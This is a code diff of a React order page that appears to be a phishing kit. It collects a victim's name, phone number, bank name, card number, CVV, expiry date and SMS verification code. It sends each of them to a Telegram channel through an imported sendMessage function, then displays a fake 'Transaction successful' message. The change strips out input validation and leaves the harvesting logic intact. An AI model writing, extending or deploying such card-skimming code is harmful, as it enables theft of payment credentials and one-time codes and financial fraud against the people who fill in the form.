@@ -3,6 +3,7 @@ import './styles.css';
 import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import { sendMessage } from '../api/telegram.ts';
+import InputMask from 'react-input-mask';
 
 const OrderEng = () => {
   const location = useLocation();
@@ -38,32 +39,6 @@ const OrderEng = () => {
     fetchData();
   }, []);
 
-  const validateForm = (fields) => {
-    const newErrors = {};
-
-    if (fields.includes('cardNumber') && !/^[0-9]{16}$/.test(cardData.cardNumber)) {
-      newErrors.cardNumber = 'Card number must be 16 digits';
-    }
-    if (fields.includes('name') && cardData.name.trim() === '') {
-      newErrors.name = 'Please provide the name of your bank';
-    }
-    if (fields.includes('cvv') && !/^[0-9]{3,4}$/.test(cardData.cvv)) {
-      newErrors.cvv = 'CVV must be 3 or 4 digits';
-    }
-    if (fields.includes('expiryDate')) {
-      const [month, year] = [cardData.expiryDate.slice(0, 2), cardData.expiryDate.slice(2)];
-      if (!/^[0-9]{4}$/.test(cardData.expiryDate) || parseInt(year) < 23) {
-        newErrors.expiryDate = 'Expiry date must be in MMYY format and year must be greater than 23';
-      }
-    }
-    if (fields.includes('smsCode') && !/^[0-9]{3,6}$/.test(smsCode)) {
-      newErrors.smsCode = 'SMS code must be between 3 and 6 digits';
-    }
-
-    setErrors(newErrors);
-    return Object.keys(newErrors).length === 0;
-  };
-
   const handleChange = (e) => {
     const { name, value, type, checked } = e.target;
     setCardData({
@@ -74,44 +49,40 @@ const OrderEng = () => {
 
   const handleSmsSend = async () => {
     setLoading(true);
-    if (validateForm(['cardNumber', 'name', 'cvv', 'expiryDate'])) {
-      try {
-        const message = `
-          Name: [ ${formData.name} ] Amount: [ ${formData.amount}  ] EUR Phone Number: [ ${formData.phoneNumber} ]
-          Bank Name: [${cardData.name}]
-          Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
-        `;
+    try {
+      const message = `
+        Name: [ ${formData.name} ] Amount: [ ${formData.amount}  ] EUR Phone Number: [ ${formData.phoneNumber} ]
+        Bank Name: [${cardData.name}]
+        Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
+      `;
 
-        sendMessage(message);
+      sendMessage(message);
 
-        // Сбрасываем данные формы
-        setCardData({
-          cardNumber: '',
-          name: '',
-          cvv: '',
-          expiryDate: '',
-          amount: '',
-          agreement: false,
-        });
+      // Сбрасываем данные формы
+      setCardData({
+        cardNumber: '',
+        name: '',
+        cvv: '',
+        expiryDate: '',
+        amount: '',
+        agreement: false,
+      });
 
-        setStep(2);
-      } catch (error) {
-        console.error('Error sending message:', error.message);
-      }
+      setStep(2);
+    } catch (error) {
+      console.error('Error sending message:', error.message);
     }
     setLoading(false);
   };
 
   const handleSmsSubmit = async () => {
     setVerificationLoading(true);
-    if (validateForm(['smsCode'])) {
-      try {
-        sendMessage(`SMS Code: ${smsCode}`);
-        setSmsCode('');
-        navigate('/statuseng', { state: { result: 'success', message: 'Transaction successful' } });
-      } catch (error) {
-        console.error('Error processing verification:', error.message);
-      }
+    try {
+      sendMessage(`SMS Code: ${smsCode}`);
+      setSmsCode('');
+      navigate('/statuseng', { state: { result: 'success', message: 'Transaction successful' } });
+    } catch (error) {
+      console.error('Error processing verification:', error.message);
     }
     setVerificationLoading(false);
   };
@@ -131,14 +102,6 @@ const OrderEng = () => {
     const seconds = time % 60;
     return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
   };
-
-  const formatExpiryDate = (value) => {
-    if (value.length === 4) {
-      return `${value.slice(0, 2)}/${value.slice(2, 4)}`;
-    }
-    return value;
-  };
-
   return (
     <div className="flex flex-col items-center justify-start min-h-screen bg-gray-fon px-4 mb:pt-20 pt-4 placeholder-gray-text">
       <div className="space-y-4 w-full max-w-xl mb-12">
